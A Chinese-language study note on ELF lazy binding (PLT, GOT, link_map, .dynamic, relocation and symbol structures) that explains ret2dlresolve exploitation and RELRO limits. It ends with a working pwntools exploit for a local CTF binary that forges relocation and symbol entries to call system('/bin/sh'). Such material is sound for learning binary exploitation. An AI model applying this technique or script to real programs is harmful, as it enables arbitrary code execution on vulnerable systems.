#### plt&got

##### section

| section  | 所在 segment | section 属性       | 用途                                                                                                     |
| -------- | ------------ | ------------------ | -------------------------------------------------------------------------------------------------------- |
| .plt     | 代码段       | RE（可读，可执行） | .plt section 实际就是通常所说的过程链接表（Procedure Linkage Table, PLT）                                |
| .plt.got | 代码段       | RE                 | .plt.got section 用于存放 __cxa_finalize 函数对应的 PLT 条目                                             |
| .got     | 数据段       | RW（可读，可写）   | * .got section 中可以用于存放全局变量的地址；* .got section 中也可以用于存放不需要延迟绑定的函数的地址。 |
| .got.plt | 数据段       | RW                 | .got.plt section 用于存放需要延迟绑定的函数的地址                                                        |

##### plt

`Procedure Linkage Table`，过程链接表，每个条目是一段代码，其中 `plt[0]` 是

```
push		got[1]
jmp		got[2]
nop
```

其余每个条目对应函数的 `plt` 表项

```
 func.plt:
       jmp      func.got
       push     reloc_arg
       jmp      plt[0];
```

`reloc_arg` 为函数对应条目在 `ELF JMPREL Relocation Table` 的偏移

##### got

`Global Offset Table`，全局偏移量表，每个条目是该函数对应的实际地址

```
got[0]		当前 elf 文件中 .dynamic 段的地址,动态端的装载地址
got[1]		link_map的地址
got[2]		dl_runtime_resolve函数的地址
got[3]		其余函数的got表项
...
```

#### 关键数据结构

##### link_map

```c
struct link_map {
	ElfW(Addr) l_addr;	/* Difference between the address in the ELF file and the address in memory */
	char      *l_name;	/* Absolute pathname where object was found */
	ElfW(Dyn) *l_ld;	/* Dynamic section of the shared object */
	struct link_map *l_next, *l_prev;	/* Chain of loaded objects */ 
	/* Plus additional fields private to the implementation */
};
```

`link_map` 是 Linux 下用于描述共享对象（shared object）的结构体，结构体的成员包括：

* `l_addr`：共享对象的加载地址，即共享对象在内存中的起始地址。
* `l_name`：指向以 null 结尾的字符串，表示共享对象的文件名。
* `l_ld`：指向动态段（Dynamic Segment）的地址，动态段是 ELF 文件中包含动态链接信息的一段。
* `l_next`：指向下一个共享对象的 `link_map` 结构体的指针。
* `l_prev`：指向前一个共享对象的 `link_map` 结构体的指针。

`link_map` 结构体通过链表的形式将各个共享对象连接起来，形成一个链表结构。这个链表记录了程序运行时所加载的共享对象的相关信息，包括加载地址、文件名、动态链接信息等。

##### .dynamic

在 `.dynamic` 段存在一组结构体 `Elf64_Dyn` ：

```c
typedef struct{
    Elf64_Sxword d_tag;				/* Dynamic entry type */
    union{
	Elf64_Xword d_val;		        /* Integer value */
	Elf64_Addr d_ptr;			/* Address value */
    }d_un;
}Elf64_Dyn;
```

* `d_tag` ,条目类型:

  ```
  #define DT_NULL		0		/* Marks end of dynamic section */
  #define DT_NEEDED	1		/* Name of needed library */
  ...
  #define DT_PLTGOT	3		/* Processor defined value */
  ...
  #define DT_STRTAB	5		/* Address of string table */
  #define DT_SYMTAB	6		/* Address of symbol table */
  #define DT_RELA		7		/* Address of Rela relocs */
  ...
  #define DT_JMPREL	23		/* Address of PLT relocs */
  ...
  ...
  ```

  `DT_JMPREL` 对应 `Elf64_Dyn` 结构体的 `d_ptr` 处存放着 `Elf64_Rela` 结构体
  `DT_SYMTAB` 对应 `Elf64_Dyn` 结构体的 `d_ptr` 处存放着 `Elf64_Sym` 结构体
  `DT_STRTAB` 对应 `Elf64_Dyn` 结构体的 `d_ptr` 处是 `ELF String Table` ，`Elf64_Sym` 的 `st_name` 偏移是从此开始的
* `d_un` ,值，类型可以为 `unsigned long long` 也可以为指针类型

##### ELF64_Rela

位于 `.rel.plt` 中的 `ELF JMPREL Relocation Table` 和 `ELF RELA Relocation Table` 的结构体

```c
typedef struct {
    Elf64_Addr r_offset;    /* 重定位入口的偏移地址 */
    Elf64_Xword r_info;     /* 重定位入口的符号索引和类型信息 */
    Elf64_Sxword r_addend;  /* 重定位入口的增量值 */
} Elf64_Rela;
```

`Elf64_Rela` 结构体的成员各占8字节，包括：

* `r_offset`：对应 `got` 表项所在地址
* `r_info`：包含了重定位入口的符号索引和类型信息。其中，通过宏 `#define ELF64_R_SYM(i)    ((i)>>32)`获取符号索引，即在
  `ELF Symbol Table` 中的偏移，通过宏 `#define ELF64_R_TYPE(i)   ((i)&0xffffffffL)`获取类型信息
* `r_addend`：重定位入口的增量值，用于在重定位过程中进行加法操作

##### Elf64_Sym

位于 `.dynsym` 中 `ELF Symbol Table` 的结构体：

```c
typedef struct {
    Elf64_Word st_name;   
    unsigned char st_info;  
    unsigned char st_other; 
    Elf64_Half st_shndx;  
    Elf64_Addr st_value;   
    Elf64_Xword st_size;  
} Elf64_Sym;
```

* `st_name `：4字节，是相对于 `.dynstr`段的偏移（相较于 `ELF String Table` 开始的偏移）
* `st_info`：8 位的字段，包含了符号的类型和绑定信息。其中，符号的类型存储在低 4 位，绑定信息存储在高 4 位。
* `st_other`：8 位的字段，目前暂未使用，保留字段。
* `st_shndx`：16 位的字段，表示符号所属的节区索引。可以通过该索引找到符号所属的节区。
* `st_value`：8字节，符号被导出时存放虚拟地址，不被导出时为NULL
* `st_size`：64 位的字段，表示符号的大小。对于函数符号，表示函数的大小；对于数据符号，表示数据的大小。

#### 装载过程

##### 延迟绑定

先跳转到对应函数的 `plt` 表，每个表项的第一条代码是跳转到对应的 `got` 表项中的地址，如果该 `got` 表项没有初始化(函数没被调用过)，则该 `got`表中存的是对应 `plt` 表项的 `jmp` 的下一条指令 `push  reloc_arg`，也就是继续执行下一条指令。接着跳转到 `plt[0]`，执行 `push got[1]`，`jmp got[2]`，调用 `dl_runtime_resolve` 函数，`dl_runtime_resolve `函数中调用了 `_dl_fixup` 函数解析导入函数的真实地址，并将 `got` 表项改写为对应函数的真实地址，从 `_dl_fixup` 返回 `dl_runtime_resolve` ，`dl_runtime_resolve` 通过寄存器r11储存的 `_dl_fixup` 函数解析的地址直接调用 `read` 函数，调用完后返回 `main` 函数。

##### dl_runtime_resolve

调用 `dl_runtime_resolve` 前，压入的 `reloc_arg` 以及 `got[1](link_map)` 作为 `dl_runtime_resolve`的两个参数，通过 `reloc_arg` 找到在 `.rel.plt` 段中的 `ELF JMPREL Relocation Table` 中对应的 `Elf64_Rela` 结构体，再通过 `Elf64_Rela` 结构体的第二个字段 `r_info` 获取 在 `.dynsym` 段中对应的 `Elf64_Sym` 结构体，再通过 `ELF64_Sym` 结构体 的 `st_name` 字段找到在 `ELF String Table` 中对应字符串的偏移，完成绑定。

#### expolit

`.dynamic` 段所在位置通过 `link_map` 获取，各段或表的基址通过 `.dynamic` 段处的 `Elf64_Dyn` 结构体获取，然后：

`reloc_arg` -> `Elf64_Rela` -> `Elf64_Sym` -> `offset in ELF String Table`

##### ELF String Table

将要劫持的函数的字符串改写为目标字符串

##### ELF64_Sym

在利用处写入要劫持的函数字符串，将 `st_name` 改写为目标相对于 `ELF String Table` 的偏移，但是目标函数字符串只能在（`ELF String Table` ，`ELF String Table` + `0xffffffff`）之间

##### ELF64_Rela

劫持 `ELF64_Rela` 结构体 `r_info` 的高32位，即函数在  `ELF Symbol Table `处的偏移，在目标处伪造一个 `ELF64_Sym `结构体，后续同对 `ELF64_Sym` 的利用

##### reloc_arg

跳转到 `plt` 对应表项时压入 `reloc_arg` ，将此 `reloc_arg` 改为一个较大的相对于 `ELF JMPREL Relocation Table` 的偏移，在偏移所在处伪造 `ELF64_Rela` 结构体，后续同对 `ELF64_Rela` 的利用

##### .dynamic

这些基址都存放于 `.dynamic` 段的一系列结构体中，在 `.dynamic` 段中伪造 `Elf64_Dyn` 结构体，改变各个段或表的基址，最终指向 `system` 字符串

##### linkmap

在 `plt[0]` 中执行了 `push got[1]` ，压入了 `linkmap` 结构体，而 `linkmap` 结构体中 `l_ld` 字段指向指向动态段 `.dynamic` ,通过压入伪造的 `linkmap` 或者 改写 `l_ld` 字段都可以劫持 `.dynamic` 段，后续同对 `.dynamic` 的利用

#### 保护对利用的限制

`No RELRO`：`.dynamic`段可写，`got`表可写

`Partial RELRO`：`.dynamic`段不可写，`got` 表前三项不可写

`Full RELRO`：所有的外部引用变量/函数都将在程序装载时由动态链接器解析完成，`got` 表不可写，bypass待续

#### newstar_dl_runtime_resolve

利用 `relog_arg`

```
from pwn import *

context(log_level='debug',arch='amd64',os='linux')
io = process('/home/kali/Desktop/newstar_dl_rr')
# io = gdb.debug('/home/kali/Desktop/newstar_dl_rr')

bss_addr = 0x404e00
ret_addr = 0x4011C7
pop_rdi_addr = 0x40115E
pop_rbp_addr = 0x401161
pop_rsi_addr = 0x40116B
read_plt_addr = 0x401060
leave_ret_addr = 0x4011A9
setbuf_plt_2 = 0x401039
fake_struct = 0x4040B0
str_bin_sh = bss_addr+0x90

payload = b'a'*0x70 + p64(bss_addr) + p64(pop_rsi_addr) + p64(bss_addr) + p64(read_plt_addr) + p64(leave_ret_addr)
io.send(payload)
sleep(0.3)

bss_payload = p64(bss_addr+0x18) + p64(leave_ret_addr) + p64(0) + p64(bss_addr+0x100) + p64(pop_rdi_addr) + p64(str_bin_sh) + p64(ret_addr) + p64(setbuf_plt_2)

# reloc_arg bss_addr+0x40
# (bss_addr+0x50-0x400518)/0x18
bss_payload += p64(0x30d) + p64(0)

# fake elf_rel  bss_addr + 0x50
# (bss_addr + 0x70 - 0x3FF3F8)/0x18
bss_payload += p64(0x404018) + p64(0x3c500000007) + p64(0) + p64(0)

# fake Elf64_Sym    bss_addr + 0x70
# (bss_addr + 0x88 - 0x3FE3C0)
bss_payload += p32(0x6ac8) + p8(12) + p8(0) + p16(0) + p64(0) +p64(0)

# bss_addr + 0x88
bss_payload += b'system' + b'\00\00' + b'/bin/sh\00'

# payload = b'a'*0x70 + p64(bss_addr) + p64(read_plt_addr)
# payload2 = b'a'*0x70 + b'a'*0x10

io.send(bss_payload)

io.interactive()
```

利用 `linkmap`:

```
待补充
```
